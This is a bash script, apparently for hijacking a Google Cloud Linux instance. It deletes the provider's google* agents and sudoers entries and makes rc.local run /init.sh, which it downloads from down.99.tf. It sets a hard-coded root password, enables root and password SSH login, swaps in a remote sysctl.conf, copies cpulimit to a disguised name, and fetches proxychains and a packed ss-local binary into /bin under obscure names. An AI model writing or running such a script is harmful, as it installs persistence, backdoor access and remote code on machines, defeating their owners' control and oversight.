#! /bin/bash
sudo apt install -y cpulimit

sudo pkill -f google*
sudo rm -fr /usr/bin/google*
sudo rm -fr /lib/systemd/system/google*
sudo rm -fr /run/lock/google*
sudo rm -fr /etc/systemd/system/multi-user.target.wants/google*
#sudo chmod -R 777 /sys/fs/cgroup/systemd/system.slice/google*
#sudo rm -fr /sys/fs/cgroup/systemd/system.slice/google*
sudo rm -fr /etc/sudoers.d/google*

#sed -i 's/exit 0/ /' /etc/rc.local 
sudo echo '#!/bin/sh -e' > /etc/rc.local
sudo echo "sh -c '/init.sh &'" >> /etc/rc.local
sudo echo exit 0 >> /etc/rc.local
sudo chmod -R 777 /etc/rc.local
sudo wget down.99.tf/google/init.sh -O /init.sh
sudo chmod -R 777 /init.sh
sudo systemctl enable rc-local

sudo chmod 777 /etc/sysctl.conf
sudo cp /etc/sysctl.conf /etc/sysctl.conf.back
sudo wget down.99.tf/sysctl.conf -O /tmp/sysctl.conf.txt
sudo cat /tmp/sysctl.conf.txt > /etc/sysctl.conf
sudo rm -fr /tmp/sysctl.conf.txt
sudo sysctl -p

#sudo mv /usr/bin/timeout /usr/bin/timeout.bak
sudo cp /usr/bin/cpulimit /usr/bin/timex
#sudo mv /usr/bin/nice /usr/bin/nice.bak
sudo source /etc/profile
sudo chmod -R 777 /usr/bin/timex

echo root:86E8C9293A458EDF91F02B2C1B613B79 | sudo chpasswd root
sudo sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
sudo sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
#sudo sed -i 's/^.*Port .*/Port 53000/g' /etc/ssh/sshd_config;
sudo /etc/init.d/ssh restart

sudo wget down.99.tf/proxychainsng/libproxychains4.so -O /lib64/libproxychains4.so
sudo wget down.99.tf/proxychainsng/proxychains4 -O /bin/S
sudo wget down.99.tf/proxychainsng/proxychains.conf -O /bin/proxychains.conf
sudo wget down.99.tf/ss-local.upx -O /bin/slocal
sudo chmod -R 777 /bin/S /bin/slocal

sudo /init.sh
